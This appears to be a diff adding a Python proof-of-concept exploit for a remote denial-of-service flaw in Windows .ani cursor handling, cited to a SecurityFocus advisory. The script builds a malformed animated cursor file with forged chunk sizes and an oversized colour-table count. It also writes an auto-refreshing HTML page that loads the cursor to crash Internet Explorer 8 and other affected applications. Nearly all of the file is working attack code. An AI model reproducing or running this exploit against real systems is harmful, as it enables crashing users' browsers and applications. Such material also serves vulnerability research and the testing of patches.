@@ -1,0 +1,180 @@
+source: http://www.securityfocus.com/bid/38579/info
+
+Microsoft Windows is prone to a remote denial-of-service vulnerability when processing '.ani' files.
+
+Successful exploits will cause the vulnerable applications that use the affected APIs to crash or become unresponsive, denying service to legitimate users. 
+
+
+def Save(name, content):
+  file = open(name, 'w');
+  try:
+    file.write(content);
+  finally:
+    file.close();
+
+def DWord(*values):
+  return DWords(values);
+def DWords(values):
+  chars = [];
+  for value in values:
+    for i in range(4):
+      byte = (value >> (i * 8)) & 0xFF;
+      chars.append(chr(byte));
+  return ''.join(chars);
+
+def Word(*values):
+  return Words(values);
+def Words(values):
+  chars = [];
+  for value in values:
+    for i in range(2):
+      byte = (value >> (i * 8)) & 0xFF;
+      chars.append(chr(byte));
+  return ''.join(chars);
+
+def Byte(*values):
+  return Bytes(values);
+def Bytes(values):
+  chars = [];
+  for value in values:
+    chars.append(chr(value));
+  return ''.join(chars);
+
+def Chunk(type_id, data, fake_size = None):
+  if fake_size is not None:
+    return type_id + DWord(fake_size) + DataOf(data);
+  return type_id + DWord(SizeOf(data)) + DataOf(data);
+
+def Pad2DWords(string):
+  pad = (4 - (len(string) % 4)) % 4;
+  return string + '\0' * pad;
+
+def SizeOf(thing):
+  return len(DataOf(thing));
+
+def DataOf(thing):
+  if type(thing) == str:
+    return thing;
+  elif type(thing) == list:
+    struct_str_list = [];
+    try:
+      for struct_member in thing:
+        struct_str_list.append(DataOf(struct_member));
+    except:
+      print 'Member of %s' % repr(thing);
+      raise;
+    return ''.join(struct_str_list);
+  else:
+    raise AssertionError('Struct contains data of unhandled type %s' % \
+          type(thing));
+
+BITMAPINFOHEADER = [
+  #http://msdn.microsoft.com/en-us/library/aa930622.aspx
+  DWord(0),           # biSize; (size of this structure) *SET LATER*
+  DWord(0),           # biWidth;
+  DWord(0),           # biHeight;
+  Word(0),            # biPlanes;
+  Word(0),            # biBitCount;
+  DWord(0),           # biCompression;
+  DWord(0),           # biSizeImage;
+  DWord(0),           # biXPelsPerMeter;
+  DWord(0),           # biYPelsPerMeter;
+  DWord(0x3F000000),  # biClrUsed (size of color table) (< 0x3FFFFFF4 to prevent overflow).
+  DWord(0),           # biClrImportant
+];
+# Set BITMAPINFOHEADER.biSize
+BITMAPINFOHEADER[0] = DWord(SizeOf(BITMAPINFOHEADER));
+
+RGBQUAD = DWords([
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+  ]);
+
+
+ICONIMAGE = [
+  # http://msdn.microsoft.com/en-us/library/ms997538.aspx
+  BITMAPINFOHEADER,  # icHeader; // DIB header
+  RGBQUAD,           # icColors[1]; // Color table
+#   BYTE            icXOR[1];      // DIB bits for XOR mask
+#   BYTE            icAND[1];      // DIB bits for AND mask
+];
+
+ICONDIR = [
+  # http://msdn.microsoft.com/en-us/library/ms997538.aspx
+  Word(0), # idReserved
+  Word(1), # idType (1=.ICO, 2=.CUR)
+  Word(1), # idCount (number of images)
+];
+
+ICONDIRENTRY = [
+  # http://msdn.microsoft.com/en-us/library/ms997538.aspx
+  Byte(0x20),         # bWidth
+  Byte(0x20),         # bHeight
+  Byte(0x0),          # bColorCount
+  Byte(0),            # bReserved (must be 0)
+  Word(0),            # wPlanes (color planes)
+  Word(0),            # wBitCount (bits per pixel)
+  DWord(0),           # dwBytesInRes (bitmap resource size)
+  DWord(0),           # dwImageOffset (bitmap offset in this file) *SET LATER*
+];
+# Set ICONDIRENTRY.dwImageOffset:
+ICONDIRENTRY[6] = DWord(SizeOf(ICONIMAGE));
+ICONDIRENTRY[7] = DWord(SizeOf(ICONDIR) + SizeOf(ICONDIRENTRY));
+
+icon_chunk = Chunk('icon', ICONDIR + ICONDIRENTRY + ICONIMAGE);
+
+fram_data = 'fram' + icon_chunk;
+
+list_fram_chunk = Chunk('LIST', fram_data, 0x231C);
+
+anih_cFrames = 0x01;
+anih_cSteps = 0x01;
+anih_cx = 0;
+anih_cy = 0;
+anih_cBitCount = 0x00;
+anih_cPlanes = 0x01;
+anih_JifRate = 0x0C;
+anih_flags = 0x01;
+# The first DWORD is the length, which we don't know yet:
+anih_struct = [
+  DWord(0),    # length of structure, to be set later.
+  DWord(1),    # cFrames
+  DWord(1),    # cSteps
+  DWord(0),    # cx (must be 0)
+  DWord(0),    # cy (must be 0)
+  DWord(0),    # cBitCount
+  DWord(1),    # cPlanes
+  DWord(0xC),  # JifRate
+  DWord(1),    # flags (1 = AF_ICON
+];
+# Set the length of the structure:
+anih_struct[0] = DWord(SizeOf(anih_struct));
+anih_chunk = Chunk('anih', anih_struct);
+
+inam_data = Pad2DWords('MSIE 8.0 .ANI vulnerability\0');
+inam_chunk = Chunk('INAM', inam_data);
+
+iart_data = Pad2DWords('SkyLined http://skypher.com\0');
+iart_chunk = Chunk('IART', iart_data);
+
+info_chunk = 'INFO' + inam_chunk + iart_chunk;
+list_info_chunk = Chunk('LIST', info_chunk);
+
+acon_chunk = 'ACON' + list_info_chunk + anih_chunk + list_fram_chunk;
+
+riff_chunk = Chunk('RIFF', acon_chunk, 0x23A8);
+
+html = '<HEAD><META http-equiv="refresh" content="0"/></HEAD>' + \
+       '<BODY style="cursor:url(repro.ani)"></BODY>';
+
+Save('repro.ani', riff_chunk);
+Save('repro.html', html);
+
